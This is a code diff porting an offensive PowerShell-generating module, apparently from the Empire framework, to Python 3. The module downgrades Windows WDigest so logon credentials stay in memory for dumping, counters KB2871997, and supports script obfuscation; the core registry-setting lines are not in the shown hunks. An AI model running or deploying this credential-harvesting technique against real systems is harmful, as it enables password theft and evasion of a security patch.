@@ -1,66 +1,68 @@
+from builtins import str
+from builtins import object
 from lib.common import helpers
 
-class Module:
 
+class Module(object):
+    
     def __init__(self, mainMenu, params=[]):
-
+        
         self.info = {
             'Name': 'Invoke-WdigestDowngrade',
-
+            
             'Author': ['@harmj0y'],
-
+            
             'Description': ("Sets wdigest on the machine to explicitly use "
                             "logon credentials. Counters kb2871997."),
-
-            'Background' : False,
-
-            'OutputExtension' : None,
             
-            'NeedsAdmin' : True,
-
-            'OpsecSafe' : False,
+            'Background': False,
             
-            'Language' : 'powershell',
-
-            'MinLanguageVersion' : '2',
+            'OutputExtension': None,
+            
+            'NeedsAdmin': True,
+            
+            'OpsecSafe': False,
+            
+            'Language': 'powershell',
+            
+            'MinLanguageVersion': '2',
             
             'Comments': [
                 'https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/'
             ]
         }
-
+        
         # any options needed by the module, settable during runtime
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Agent' : {
-                'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'Agent': {
+                'Description': 'Agent to run module on.',
+                'Required': True,
+                'Value': ''
             },
-            'NoLock' : {
-                'Description'   :   "Switch. Don't lock the workstation after registry change.",
-                'Required'      :   False,
-                'Value'         :   ''
+            'NoLock': {
+                'Description': "Switch. Don't lock the workstation after registry change.",
+                'Required': False,
+                'Value': ''
             },
-            'Cleanup' : {
-                'Description'   :   'Switch. Disable the registry key.',
-                'Required'      :   False,
-                'Value'         :   ''
+            'Cleanup': {
+                'Description': 'Switch. Disable the registry key.',
+                'Required': False,
+                'Value': ''
             }
         }
-
+        
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-
+        
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
                 self.options[option]['Value'] = value
-
-
+    
     def generate(self, obfuscate=False, obfuscationCommand=""):
         
         script = """
@@ -120,11 +122,11 @@ function Invoke-WdigestDowngrade {
 
     if($Cleanup){
         try {
-            Remove-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction Stop
+            Remove-ItemProperty -Force -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest" -Name "UseLogonCredential" -ErrorAction Stop
             "Wdigest set to not use logoncredential."
         }
         catch {
-            "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential not set"
+            "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential not set"
         }
     }
     else{
@@ -138,11 +140,11 @@ function Invoke-WdigestDowngrade {
     }
 }
 """
-
+        
         script += "Invoke-WdigestDowngrade"
-
+        
         # add any arguments to the end execution of the script
-        for option,values in self.options.iteritems():
+        for option, values in self.options.items():
             if option.lower() != "agent":
                 if values['Value'] and values['Value'] != '':
                     if values['Value'].lower() == "true":
@@ -151,5 +153,6 @@ function Invoke-WdigestDowngrade {
                     else:
                         script += " -" + str(option) + " " + str(values['Value'])
         if obfuscate:
-            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
+                                       obfuscationCommand=obfuscationCommand)
         return script
